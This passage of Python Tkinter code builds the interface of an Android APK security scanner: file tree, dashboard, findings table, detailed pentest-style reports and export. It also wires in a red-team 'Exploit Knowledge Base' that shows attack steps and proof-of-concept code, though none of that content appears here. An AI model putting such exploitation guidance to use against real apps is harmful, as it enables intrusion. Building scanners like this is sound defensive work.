    tk.Label(header, text="v{}".format(VERSION), font=(FONT, 10), bg=BG2, fg=FG2).pack(side="left", padx=(6, 0), pady=(4, 0))
    tk.Frame(header, bg=BORDER, width=1).pack(side="left", fill="y", padx=16, pady=10)
    tk.Label(header, text="Android Application Security Scanner", font=(FONT, 11), bg=BG2, fg=FG2).pack(side="left")

    # Right side of header — action buttons
    pb = ttk.Progressbar(header, length=180, mode="determinate")
    pb.pack(side="right", padx=(0, 16), pady=18)

    def open_apk():
        p = filedialog.askopenfilename(filetypes=[("APK files", "*.apk"), ("All files", "*.*")])
        if p: load_apk(p)

    def load_apk(path):
        sv.set("\u23f3  Extracting APK...")
        pb.configure(value=0); root.update()
        def worker():
            try:
                f, t = extract_apk(path)
                state["files"] = f; state["apk"] = os.path.basename(path)
                root.after(0, lambda: on_extract_done(f))
            except Exception as e:
                root.after(0, lambda: messagebox.showerror("Error", str(e)))
        threading.Thread(target=worker, daemon=True).start()

    def on_extract_done(f):
        ft.delete(*ft.get_children())
        for p in sorted(f.keys()):
            parts = p.split("/"); par = ""
            for j, pt in enumerate(parts):
                nid = "/".join(parts[:j + 1])
                if not ft.exists(nid):
                    ft.insert(par, "end", iid=nid, text="  " + pt, open=(j < 2))
                par = nid
        sv.set("\u2705  Loaded: {}  |  {} files extracted".format(state["apk"], len(f)))
        pb.configure(value=100)
        nb.select(0)

    def do_scan():
        if not state["files"]:
            messagebox.showwarning("Scan", "Open an APK first."); return
        sv.set("\U0001f50d  Scanning {} rules + taint analysis...".format(len(RULES)))
        pb.configure(value=0); root.update()
        def worker():
            fi = scan_files(state["files"],
                            lambda p, m: root.after(0, lambda v=p: pb.configure(value=v)))
            state["findings"] = fi
            try: save_session(state["apk"], state["files"], fi)
            except: pass
            root.after(0, lambda: on_scan_done(fi))
        threading.Thread(target=worker, daemon=True).start()

    def on_scan_done(fi):
        pb.configure(value=100)
        sc = _sev_counts(fi)
        taint_n = sum(1 for f in fi if f.id.startswith("DA-TAINT"))
        sv.set("\u2705  {} findings  |  {} taint flows  |  CRIT: {}  HIGH: {}  MED: {}  LOW: {}  INFO: {}".format(
            len(fi), taint_n, sc["CRITICAL"], sc["HIGH"], sc["MEDIUM"], sc["LOW"], sc["INFO"]))
        for w in dash_inner.winfo_children(): w.destroy()
        _build_dashboard(dash_inner, fi, sc)
        ftree.delete(*ftree.get_children())
        for i, f in enumerate(fi):
            tag = "even" if i % 2 == 0 else "odd"
            ftree.insert("", "end", values=(f.id, f.severity, f.title, f.cwe, f.file, f.line, f.cvss), tags=(tag,))
        nb.select(0)

    def do_export():
        if not state["findings"]:
            messagebox.showwarning("Export", "Run scan first."); return
        fmt = ev.get()
        ext = {"HTML": ".html", "PDF": ".pdf", "Word": ".docx", "Excel": ".xlsx", "JSON": ".json", "CSV": ".csv", "SARIF": ".sarif.json"}[fmt]
        p = filedialog.asksaveasfilename(
            defaultextension=ext,
            initialfile="{}_{}.{}".format(APP_NAME, state["apk"], ext.lstrip(".")))
        if not p: return
        try:
            {"HTML": export_html, "PDF": export_pdf, "Word": export_docx, "Excel": export_xlsx,
             "JSON": export_json, "CSV": export_csv_report,
             "SARIF": export_sarif}[fmt](state["findings"], state["apk"], p, state["files"])
            sv.set("\U0001f4e4  Exported: " + p)
            if fmt == "HTML": webbrowser.open("file://" + os.path.abspath(p))
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def do_load_session():
        sessions = list_sessions()
        if not sessions:
            messagebox.showinfo("Sessions", "No saved sessions found."); return
        p = filedialog.askopenfilename(initialdir=SESSION_DIR, filetypes=[("Session", "*.session.json")])
        if not p: return
        try:
            apk_name, findings = load_session(p)
            state["apk"] = apk_name; state["findings"] = findings
            on_scan_done(findings)
            sv.set("\U0001f4c2  Restored session: " + apk_name)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    # ── Toolbar ──
    toolbar = tk.Frame(root, bg=BG, pady=8, padx=12)
    toolbar.pack(fill="x")
    ttk.Button(toolbar, text="\U0001f4c1  Open APK", command=open_apk).pack(side="left", padx=(0, 6))
    ttk.Button(toolbar, text="\U0001f50d  Scan", command=do_scan).pack(side="left", padx=6)
    tk.Frame(toolbar, bg=BORDER, width=1, height=28).pack(side="left", padx=12)
    ev = tk.StringVar(value="HTML")
    fmt_menu = ttk.OptionMenu(toolbar, ev, "HTML", "HTML", "PDF", "Word", "Excel", "JSON", "CSV", "SARIF")
    fmt_menu.pack(side="left", padx=6)
    ttk.Button(toolbar, text="\U0001f4e4  Export", command=do_export, style="Secondary.TButton").pack(side="left", padx=6)
    tk.Frame(toolbar, bg=BORDER, width=1, height=28).pack(side="left", padx=12)
    ttk.Button(toolbar, text="\U0001f4c2  Load Session", command=do_load_session, style="Secondary.TButton").pack(side="left", padx=6)

    # ── Main Layout (PanedWindow) ──
    pw = ttk.PanedWindow(root, orient="horizontal")
    pw.pack(fill="both", expand=True, padx=8, pady=(0, 4))

    # Left panel: File tree
    left = tk.Frame(pw, bg=BG2, highlightbackground=BORDER, highlightthickness=1)
    tree_header = tk.Frame(left, bg=BG3, height=36)
    tree_header.pack(fill="x")
    tree_header.pack_propagate(False)
    tk.Label(tree_header, text="  \U0001f4c1  APK File Tree", font=(FONT, 10, "bold"),
             bg=BG3, fg=ACC, anchor="w").pack(fill="x", padx=8, pady=6)
    ft = ttk.Treeview(left, show="tree")
    ft_sb = ttk.Scrollbar(left, orient="vertical", command=ft.yview)
    ft.configure(yscrollcommand=ft_sb.set)
    ft_sb.pack(side="right", fill="y")
    ft.pack(fill="both", expand=True)
    pw.add(left, weight=1)

    def on_tree_select(e):
        s = ft.selection()
        if not s: return
        content = state["files"].get(s[0], "")
        if content:
            ct.configure(state="normal"); ct.delete("1.0", "end")
            ct.insert("1.0", content)
            _syntax_highlight(ct)
            ct.configure(state="disabled")
            nb.select(source_tab_idx)
    ft.bind("<<TreeviewSelect>>", on_tree_select)

    # Right panel: Notebook
    right = tk.Frame(pw, bg=BG)
    nb = ttk.Notebook(right)
    nb.pack(fill="both", expand=True)
    pw.add(right, weight=4)

    # ══════════════════════════════════════════════════════════
    #  TAB 0: DASHBOARD (Enterprise Grade)
    # ══════════════════════════════════════════════════════════
    dash_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    dash_inner = tk.Frame(dash_canvas, bg=BG)
    dash_sb = ttk.Scrollbar(dash_canvas, orient="vertical", command=dash_canvas.yview)
    dash_canvas.configure(yscrollcommand=dash_sb.set)
    dash_sb.pack(side="right", fill="y")
    dash_canvas.pack(fill="both", expand=True)
    dash_cw = dash_canvas.create_window((0, 0), window=dash_inner, anchor="nw")
    dash_inner.bind("<Configure>", lambda e: dash_canvas.configure(scrollregion=dash_canvas.bbox("all")))
    dash_canvas.bind("<Configure>", lambda e: dash_canvas.itemconfig(dash_cw, width=e.width))
    # Mouse wheel scroll - registered globally
    _register_scrollable(0, dash_canvas, dash_inner)
    nb.add(dash_canvas, text="  \U0001f4ca  Dashboard  ")

    def _build_dashboard(par, fi, sc):
        PAD = 24
        # Title row
        title_row = tk.Frame(par, bg=BG)
        title_row.pack(fill="x", padx=PAD, pady=(PAD, 4))
        tk.Label(title_row, text="Android Application Security Dashboard",
                 font=(FONT, 20, "bold"), bg=BG, fg="#ffffff", anchor="w").pack(side="left")
        if state["apk"]:
            tk.Label(title_row, text=state["apk"],
                     font=(MONO, 11), bg=BG, fg=FG2, anchor="e").pack(side="right")

        if not fi:
            # Empty state
            empty = make_card(par, px=40, py=60)
            empty.pack(fill="x", padx=PAD, pady=40)
            tk.Label(empty, text="\U0001f4f1", font=(FONT, 48), bg=BG_CARD, fg=FG3).pack()
            tk.Label(empty, text="No Scan Results", font=(FONT, 18, "bold"), bg=BG_CARD, fg=FG).pack(pady=(12, 4))
            tk.Label(empty, text="Open an APK file and click Scan to begin the security assessment.",
                     font=(FONT, 12), bg=BG_CARD, fg=FG2).pack()
            return

        tk.Frame(par, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(8, 16))

        # ── Risk Score Section ──
        risk_row = tk.Frame(par, bg=BG)
        risk_row.pack(fill="x", padx=PAD, pady=(0, 12))

        total_cvss = sum(f.cvss for f in fi if isinstance(f.cvss, (int, float)))
        avg = total_cvss / max(len(fi), 1)
        risk = "CRITICAL" if avg >= 9 else "HIGH" if avg >= 7 else "MEDIUM" if avg >= 4 else "LOW"
        risk_col = SEVC.get(risk, FG)

        risk_card = make_card(risk_row, px=24, py=16)
        risk_card.pack(side="left", fill="x", expand=True, padx=(0, 8))
        r_top = tk.Frame(risk_card, bg=BG_CARD)
        r_top.pack(fill="x")
        tk.Label(r_top, text="RISK SCORE", font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG3, anchor="w").pack(side="left")
        tk.Label(r_top, text=risk, font=(FONT, 11, "bold"), bg=BG_CARD, fg=risk_col, anchor="e").pack(side="right")
        tk.Label(risk_card, text="{:.1f}".format(avg), font=(MONO, 36, "bold"), bg=BG_CARD, fg=risk_col, anchor="w").pack(anchor="w")
        tk.Label(risk_card, text="/ 10.0  avg CVSS across {} findings".format(len(fi)),
                 font=(FONT, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(anchor="w")

        total_card = make_card(risk_row, px=24, py=16)
        total_card.pack(side="left", fill="x", expand=True, padx=8)
        tk.Label(total_card, text="TOTAL FINDINGS", font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG3, anchor="w").pack(anchor="w")
        tk.Label(total_card, text=str(len(fi)), font=(MONO, 36, "bold"), bg=BG_CARD, fg=ACC, anchor="w").pack(anchor="w")
        taint_n = sum(1 for f in fi if f.id.startswith("DA-TAINT"))
        tk.Label(total_card, text="incl. {} taint flow detections".format(taint_n),
                 font=(FONT, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(anchor="w")

        files_card = make_card(risk_row, px=24, py=16)
        files_card.pack(side="left", fill="x", expand=True, padx=(8, 0))
        tk.Label(files_card, text="FILES ANALYZED", font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG3, anchor="w").pack(anchor="w")
        tk.Label(files_card, text=str(len(state["files"])), font=(MONO, 36, "bold"), bg=BG_CARD, fg=GREEN, anchor="w").pack(anchor="w")
        tk.Label(files_card, text="files extracted from APK",
                 font=(FONT, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(anchor="w")

        # ── Severity Breakdown Cards ──
        sev_row = tk.Frame(par, bg=BG)
        sev_row.pack(fill="x", padx=PAD, pady=(0, 16))
        sev_labels = [("CRITICAL", RED, "\u26d4"), ("HIGH", ORANGE, "\U0001f534"),
                      ("MEDIUM", YELLOW, "\U0001f7e1"), ("LOW", ACC, "\U0001f535"), ("INFO", FG2, "\u2139\ufe0f")]
        for sev_name, sev_color, icon in sev_labels:
            cnt = sc.get(sev_name, 0)
            card = make_card(sev_row, px=0, py=12)
            card.pack(side="left", fill="x", expand=True, padx=4)
            inner = tk.Frame(card, bg=BG_CARD)
            inner.pack(fill="x", padx=16)
            # Color accent bar on top
            tk.Frame(card, bg=sev_color, height=3).place(x=0, y=0, relwidth=1.0)
            tk.Label(inner, text=str(cnt), font=(MONO, 28, "bold"), bg=BG_CARD, fg=sev_color, anchor="center").pack()
            tk.Label(inner, text=sev_name, font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG2, anchor="center").pack()

        # ── Android Components Card ──
        comps = _extract_android_components(state["files"])
        comp_card = make_card(par, px=20, py=16)
        comp_card.pack(fill="x", padx=PAD, pady=(0, 16))
        ncomp = len(comps["activities"])+len(comps["services"])+len(comps["receivers"])+len(comps["providers"])
        tk.Label(comp_card, text="ANDROID COMPONENTS ({})".format(ncomp), font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 8))
        if comps["package"]:
            tk.Label(comp_card, text="Package: {}  |  Min SDK: {}  |  Target SDK: {}".format(
                comps["package"], comps.get("min_sdk","?"), comps.get("target_sdk","?")),
                font=(MONO, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(fill="x", pady=(0, 8))
        comp_info = tk.Frame(comp_card, bg=BG_CARD)
        comp_info.pack(fill="x")
        for lbl, lst, col in [("Activities", comps["activities"], GREEN), ("Services", comps["services"], ACC),
                               ("Receivers", comps["receivers"], ORANGE), ("Providers", comps["providers"], PURPLE)]:
            cf = tk.Frame(comp_info, bg=BG3, padx=12, pady=6)
            cf.pack(side="left", padx=(0, 8), fill="x", expand=True)
            tk.Label(cf, text=str(len(lst)), font=(MONO, 20, "bold"), bg=BG3, fg=col).pack()
            tk.Label(cf, text=lbl, font=(FONT, 9), bg=BG3, fg=FG2).pack()
        # Permissions count
        pf = tk.Frame(comp_info, bg=BG3, padx=12, pady=6)
        pf.pack(side="left", fill="x", expand=True)
        tk.Label(pf, text=str(len(comps["permissions"])), font=(MONO, 20, "bold"), bg=BG3, fg=YELLOW).pack()
        tk.Label(pf, text="Permissions", font=(FONT, 9), bg=BG3, fg=FG2).pack()

        # ── Charts Row: Pie + Bar ──
        chart_row = tk.Frame(par, bg=BG)
        chart_row.pack(fill="x", padx=PAD, pady=(0, 16))

        # Pie Chart
        pie_card = make_card(chart_row, px=12, py=12)
        pie_card.pack(side="left", fill="both", expand=True, padx=(0, 8))
        tk.Label(pie_card, text="SEVERITY DISTRIBUTION", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 8))
        pie_cv = tk.Canvas(pie_card, width=280, height=220, bg=BG_CARD, highlightthickness=0)
        pie_cv.pack()
        total_f = sum(sc.values())
        if total_f > 0:
            cx, cy, r = 140, 110, 85
            start_angle = 0
            sev_colors_pie = [("CRITICAL", RED), ("HIGH", ORANGE), ("MEDIUM", YELLOW), ("LOW", ACC), ("INFO", FG2)]
            for sev_name, sev_col in sev_colors_pie:
                cnt = sc.get(sev_name, 0)
                if cnt == 0: continue
                extent = (cnt / total_f) * 360
                pie_cv.create_arc(cx-r, cy-r, cx+r, cy+r, start=start_angle, extent=extent,
                                  fill=sev_col, outline=BG_CARD, width=2)
                # Label
                mid = math.radians(start_angle + extent/2)
                lx = cx + (r+25) * math.cos(mid)
                ly = cy - (r+25) * math.sin(mid)
                pie_cv.create_text(lx, ly, text="{}: {}".format(sev_name[:4], cnt),
                                   fill=FG2, font=(FONT, 8))
                start_angle += extent

        # Bar Chart (OWASP categories)
        bar_card = make_card(chart_row, px=12, py=12)
        bar_card.pack(side="left", fill="both", expand=True, padx=(8, 0))
        tk.Label(bar_card, text="OWASP CATEGORY ANALYSIS", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 8))
        bar_cv = tk.Canvas(bar_card, width=350, height=220, bg=BG_CARD, highlightthickness=0)
        bar_cv.pack()
        cats_bar = {}
        for f in fi:
            cat = f.id.split("-")[1] if "-" in f.id else "OTH"
            cats_bar[cat] = cats_bar.get(cat, 0) + 1
        cat_nm = {"MAN":"Manifest","CRY":"Crypto","SEC":"Secrets","NET":"Network","PLT":"Platform",
                  "INJ":"Injection","RES":"Resilience","PRV":"Privacy","CLD":"Cloud","AUT":"Auth",
                  "WEB":"Web","OTH":"Other","TAINT":"Taint"}
        cat_cl = {"MAN":ORANGE,"CRY":RED,"SEC":RED,"NET":ORANGE,"PLT":YELLOW,"INJ":RED,
                  "RES":ACC,"PRV":PURPLE,"CLD":ORANGE,"AUT":ORANGE,"WEB":RED,"OTH":FG2,"TAINT":RED}
        if cats_bar:
            sorted_cats = sorted(cats_bar.items(), key=lambda x:-x[1])[:10]
            mx_val = max(v for _,v in sorted_cats)
            bh = 16; by = 10
            for i, (cat, cnt) in enumerate(sorted_cats):
                y_pos = by + i * (bh + 4)
                bw = int((cnt / mx_val) * 200)
                bar_cv.create_text(5, y_pos + bh//2, text=cat_nm.get(cat, cat), anchor="w",
                                   fill=FG2, font=(FONT, 8))
                bar_cv.create_rectangle(75, y_pos, 75+bw, y_pos+bh,
                                        fill=cat_cl.get(cat, ACC), outline="")
                bar_cv.create_text(80+bw, y_pos + bh//2, text=str(cnt), anchor="w",
                                   fill=FG2, font=(MONO, 9, "bold"))

        # ── Two-column layout: Categories + Top Findings ──
        cols_row = tk.Frame(par, bg=BG)
        cols_row.pack(fill="x", padx=PAD, pady=(0, 16))

        # Left column: Category Breakdown
        cat_card = make_card(cols_row, px=20, py=16)
        cat_card.pack(side="left", fill="both", expand=True, padx=(0, 8))
        tk.Label(cat_card, text="CATEGORY BREAKDOWN", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 12))

        cats = {}
        for f in fi:
            cat = f.id.split("-")[1] if "-" in f.id else "OTH"
            cats[cat] = cats.get(cat, 0) + 1
        cat_names = {"MAN": "Manifest", "CRY": "Cryptography", "SEC": "Secrets & Storage",
                     "NET": "Network Security", "PLT": "Platform", "INJ": "Injection",
                     "RES": "Resilience", "PRV": "Privacy", "CLD": "Cloud Config",
                     "AUT": "Authentication", "WEB": "Web Security", "OTH": "Other",
                     "TAINT": "Taint Analysis"}
        max_cat = max(cats.values()) if cats else 1
        for cat, cnt in sorted(cats.items(), key=lambda x: -x[1]):
            row = tk.Frame(cat_card, bg=BG_CARD)
            row.pack(fill="x", pady=3)
            name = cat_names.get(cat, cat)
            tk.Label(row, text=name, font=(FONT, 10), bg=BG_CARD, fg=FG,
                     anchor="w", width=18).pack(side="left")
            bar_frame = tk.Frame(row, bg=BG3, height=16)
            bar_frame.pack(side="left", fill="x", expand=True, padx=(4, 8))
            bar_frame.pack_propagate(False)
            bar_pct = cnt / max_cat
            colors = {
                "MAN": ORANGE, "CRY": RED, "SEC": RED, "NET": ORANGE,
                "PLT": YELLOW, "INJ": RED, "RES": ACC, "PRV": PURPLE,
                "CLD": ORANGE, "AUT": ORANGE, "WEB": RED, "OTH": FG2, "TAINT": RED
            }
            bar = tk.Frame(bar_frame, bg=colors.get(cat, ACC), height=16)
            bar.place(x=0, y=0, relwidth=bar_pct, relheight=1.0)
            tk.Label(row, text=str(cnt), font=(MONO, 10, "bold"), bg=BG_CARD, fg=FG2,
                     width=4, anchor="e").pack(side="right")

        # Right column: Top Findings
        top_card = make_card(cols_row, px=20, py=16)
        top_card.pack(side="left", fill="both", expand=True, padx=(8, 0))
        tk.Label(top_card, text="TOP FINDINGS (by severity)", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 12))

        for i, f in enumerate(fi[:15]):
            row = tk.Frame(top_card, bg=BG_CARD if i % 2 == 0 else BG3)
            row.pack(fill="x", pady=1)
            rbg = BG_CARD if i % 2 == 0 else BG3
            # Severity badge
            badge = tk.Label(row, text=" {} ".format(f.severity[:4]),
                             font=(MONO, 8, "bold"), bg=SEVC.get(f.severity, FG2),
                             fg="#000000" if f.severity in ("MEDIUM", "LOW") else "#ffffff",
                             anchor="center", width=6)
            badge.pack(side="left", padx=(4, 8), pady=2)
            tk.Label(row, text=f.title, font=(FONT, 10), bg=rbg, fg=FG, anchor="w").pack(side="left", fill="x", expand=True)
            tk.Label(row, text="{}:{}".format(f.file.split("/")[-1] if "/" in f.file else f.file, f.line), font=(MONO, 9), bg=rbg, fg=FG3, anchor="e").pack(side="right", padx=4)

        # ── Taint Flow Section ──
        taint = [f for f in fi if f.id.startswith("DA-TAINT")]
        if taint:
            taint_card = make_card(par, px=20, py=16)
            taint_card.pack(fill="x", padx=PAD, pady=(0, 16))
            tk.Label(taint_card, text="\u26a0\ufe0f  TAINT FLOW ANALYSIS  ({} flows detected)".format(len(taint)),
                     font=(FONT, 11, "bold"), bg=BG_CARD, fg=RED, anchor="w").pack(fill="x", pady=(0, 12))
            for i, f in enumerate(taint[:12]):
                row = tk.Frame(taint_card, bg=BG_CARD if i % 2 == 0 else BG3)
                row.pack(fill="x", pady=1)
                rbg = BG_CARD if i % 2 == 0 else BG3
                tk.Label(row, text=" TAINT ", font=(MONO, 8, "bold"), bg=RED, fg="#ffffff",
                         anchor="center", width=6).pack(side="left", padx=(4, 8), pady=2)
                tk.Label(row, text=f.title, font=(FONT, 10), bg=rbg, fg=FG, anchor="w").pack(side="left", fill="x", expand=True)
                tk.Label(row, text="L:{}".format(f.line), font=(MONO, 9), bg=rbg, fg=FG3).pack(side="right", padx=4)

        # Footer
        tk.Frame(par, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(8, 4))
        tk.Label(par, text="{} v{}  |  {} rules + taint engine  |  {} findings".format(
            APP_NAME, VERSION, len(RULES), len(fi)),
            font=(FONT, 9), bg=BG, fg=FG3, anchor="center").pack(pady=(0, PAD))


    _build_dashboard(dash_inner, [], {})

    # ══════════════════════════════════════════════════════════
    #  TAB 1: FINDINGS TABLE
    # ══════════════════════════════════════════════════════════
    findings_frame = tk.Frame(nb, bg=BG)
    # Search / filter bar
    filter_bar = tk.Frame(findings_frame, bg=BG2, height=40)
    filter_bar.pack(fill="x")
    filter_bar.pack_propagate(False)
    tk.Label(filter_bar, text="  \U0001f50d", font=(FONT, 12), bg=BG2, fg=FG2).pack(side="left")
    filter_var = tk.StringVar()
    filter_entry = tk.Entry(filter_bar, textvariable=filter_var, bg=BG3, fg=FG,
                            insertbackground=FG, font=(FONT, 11), bd=0, relief="flat")
    filter_entry.pack(side="left", fill="x", expand=True, padx=8, pady=8)
    filter_entry.insert(0, "Filter findings...")
    def _on_filter_focus_in(e):
        if filter_entry.get() == "Filter findings...":
            filter_entry.delete(0, "end")
    def _on_filter_focus_out(e):
        if not filter_entry.get():
            filter_entry.insert(0, "Filter findings...")
    filter_entry.bind("<FocusIn>", _on_filter_focus_in)
    filter_entry.bind("<FocusOut>", _on_filter_focus_out)
    def _on_filter_change(*a):
        q = filter_var.get().lower()
        if q == "filter findings...": q = ""
        ftree.delete(*ftree.get_children())
        for i, f in enumerate(state["findings"]):
            if q and q not in f.title.lower() and q not in f.id.lower() and q not in f.severity.lower() and q not in f.file.lower():
                continue
            tag = "even" if i % 2 == 0 else "odd"
            ftree.insert("", "end", values=(f.id, f.severity, f.title, f.cwe, f.file, f.line, f.cvss), tags=(tag,))
    filter_var.trace_add("write", _on_filter_change)

    # Treeview
    cols = ("ID", "Severity", "Title", "CWE", "File", "Line", "CVSS")
    ftree = ttk.Treeview(findings_frame, columns=cols, show="headings", height=30)
    ftree.tag_configure("even", background=BG2)
    ftree.tag_configure("odd", background=BG3)
    col_widths = {"ID": 110, "Severity": 90, "Title": 280, "CWE": 85, "File": 320, "Line": 55, "CVSS": 65}
    for c in cols:
        ftree.heading(c, text=c, anchor="w")
        ftree.column(c, width=col_widths.get(c, 100), anchor="w")
    f_sb = ttk.Scrollbar(findings_frame, orient="vertical", command=ftree.yview)
    ftree.configure(yscrollcommand=f_sb.set)
    f_sb.pack(side="right", fill="y")
    ftree.pack(fill="both", expand=True)

    def on_finding_click(e):
        s = ftree.selection()
        if not s: return
        v = ftree.item(s[0], "values")
        for f in state["findings"]:
            if f.id == v[0] and str(f.line) == str(v[5]):
                dt.configure(state="normal"); dt.delete("1.0", "end")
                # Professional pentest-style report
                dt.insert("end", "\n")
                dt.insert("end", "  \u2588\u2588 SECURITY FINDING REPORT\n", "heading")
                dt.insert("end", "  " + "\u2500" * 60 + "\n\n", "border")
                # Risk rating box
                risk_label = {"CRITICAL":"CRITICAL RISK","HIGH":"HIGH RISK","MEDIUM":"MEDIUM RISK","LOW":"LOW RISK","INFO":"INFORMATIONAL"}.get(f.severity,"")
                dt.insert("end", "  [{} | CVSS {}/10.0]\n\n".format(risk_label, f.cvss), "evidence")
                # Summary
                dt.insert("end", "  1. VULNERABILITY SUMMARY\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  Title:       {}\n".format(f.title), "field_value")
                dt.insert("end", "  ID:          {}\n".format(f.id), "field_label")
                dt.insert("end", "  Severity:    {}\n".format(f.severity), "field_value")
                dt.insert("end", "  CWE:         {} (https://cwe.mitre.org/data/definitions/{}.html)\n".format(f.cwe, f.cwe.split("-")[1] if "-" in f.cwe else ""), "field_label")
                dt.insert("end", "  OWASP:       {} (Mobile Top 10)\n".format(f.owasp), "field_label")
                dt.insert("end", "  CVSS 3.1:    {}/10.0\n".format(f.cvss), "field_label")
                dt.insert("end", "  Location:    {} : line {}\n".format(f.file, f.line), "field_label")
                dt.insert("end", "\n")
                # Description
                dt.insert("end", "  2. TECHNICAL DESCRIPTION\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  {}\n\n".format(f.desc), "desc_text")
                dt.insert("end", "  This vulnerability was identified through static analysis of the\n", "desc_text")
                dt.insert("end", "  application's decompiled source code. The affected code pattern\n", "desc_text")
                dt.insert("end", "  matches known insecure implementation ({}).\n\n".format(f.cwe), "desc_text")
                # Impact
                dt.insert("end", "  3. IMPACT ASSESSMENT\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                impacts = {"CRITICAL":"Complete compromise of application data and user accounts. An attacker can exploit this remotely without authentication.",
                           "HIGH":"Significant data exposure or unauthorized access. Exploitation requires minimal user interaction.",
                           "MEDIUM":"Partial information disclosure or limited unauthorized actions. Requires specific conditions to exploit.",
                           "LOW":"Minor information leak with limited security impact. Exploitation difficulty is high.",
                           "INFO":"Informational finding for security hardening. No direct exploit path."}
                dt.insert("end", "  {}\n\n".format(impacts.get(f.severity, "")), "desc_text")
                # Evidence
                dt.insert("end", "  4. EVIDENCE / PROOF\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  File: {}\n".format(f.file), "field_label")
                dt.insert("end", "  Line: {}\n".format(f.line), "field_label")
                dt.insert("end", "  Code:\n", "field_label")
                dt.insert("end", "    >>> {}\n\n".format(f.evidence), "evidence")
                # Remediation
                dt.insert("end", "  5. REMEDIATION\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  {}\n\n".format(f.fix), "fix_text")
                # Exploitation
                for ex in EXPLOITS:
                    if any(kw.lower() in f.title.lower() for kw in ex["vuln"].split()):
                        dt.insert("end", "  6. EXPLOITATION (Red Team)\n", "section")
                        dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                        dt.insert("end", "  Tools: {}\n\n".format(ex["tool"]), "field_label")
                        dt.insert("end", "  Attack Steps:\n", "field_value")
                        dt.insert("end", "  " + ex["steps"].replace("\n", "\n  ") + "\n\n", "desc_text")
                        dt.insert("end", "  Proof of Concept:\n", "field_value")
                        dt.insert("end", "  " + ex["poc"].replace("\n", "\n  ") + "\n\n", "evidence")
                        break
                # References
                dt.insert("end", "  7. REFERENCES\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  - {}: https://cwe.mitre.org/data/definitions/{}.html\n".format(f.cwe, f.cwe.split("-")[1] if "-" in f.cwe else ""), "field_label")
                dt.insert("end", "  - OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/\n", "field_label")
                dt.insert("end", "  - OWASP MASTG: https://mas.owasp.org/MASTG/\n", "field_label")
                dt.insert("end", "  - CVSS Calculator: https://www.first.org/cvss/calculator/3.1\n\n", "field_label")
                dt.insert("end", "  " + "\u2500" * 60 + "\n", "border")
                dt.insert("end", "  Report generated by {} v{}\n".format(APP_NAME, VERSION), "field_label")
                dt.configure(state="disabled")
                nb.select(detail_tab_idx)
                break
    ftree.bind("<<TreeviewSelect>>", on_finding_click)
    nb.add(findings_frame, text="  \U0001f6e1\ufe0f  Findings  ")

    # ══════════════════════════════════════════════════════════
    #  TAB 2: DETAIL VIEW
    # ══════════════════════════════════════════════════════════
    detail_frame = tk.Frame(nb, bg=BG)
    dt = scrolledtext.ScrolledText(detail_frame, wrap="word", bg=BG2, fg=FG,
                                    font=(MONO, 11), state="disabled", bd=0,
                                    padx=16, pady=16)
    dt.pack(fill="both", expand=True)
    dt.tag_configure("heading", foreground=ACC, font=(FONT, 16, "bold"))
    dt.tag_configure("border", foreground=BORDER)
    dt.tag_configure("section", foreground=ORANGE, font=(FONT, 12, "bold"))
    dt.tag_configure("field_label", foreground=FG2, font=(MONO, 11))
    dt.tag_configure("field_value", foreground=FG, font=(MONO, 11, "bold"))
    dt.tag_configure("evidence", foreground=YELLOW, font=(MONO, 10))
    dt.tag_configure("desc_text", foreground=FG, font=(FONT, 11))
    dt.tag_configure("fix_text", foreground=GREEN, font=(FONT, 11))
    nb.add(detail_frame, text="  \U0001f4cb  Detail  ")
    detail_tab_idx = 2

    # ══════════════════════════════════════════════════════════
    #  TAB 3: EXPLOITS (Structured Cards)
    # ══════════════════════════════════════════════════════════
    ex_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    ex_inner = tk.Frame(ex_canvas, bg=BG)
    ex_sb = ttk.Scrollbar(ex_canvas, orient="vertical", command=ex_canvas.yview)
    ex_canvas.configure(yscrollcommand=ex_sb.set)
    ex_sb.pack(side="right", fill="y"); ex_canvas.pack(fill="both", expand=True)
    ex_cw = ex_canvas.create_window((0, 0), window=ex_inner, anchor="nw")
    ex_inner.bind("<Configure>", lambda e: ex_canvas.configure(scrollregion=ex_canvas.bbox("all")))
    ex_canvas.bind("<Configure>", lambda e: ex_canvas.itemconfig(ex_cw, width=e.width))

    tk.Label(ex_inner, text="Exploit Knowledge Base", font=(FONT, 18, "bold"),
             bg=BG, fg="#ffffff", anchor="w").pack(fill="x", padx=24, pady=(24, 4))
    tk.Label(ex_inner, text="{} exploit techniques with tools, steps, and proof-of-concept code".format(len(EXPLOITS)),
             font=(FONT, 11), bg=BG, fg=FG2, anchor="w").pack(fill="x", padx=24, pady=(0, 16))
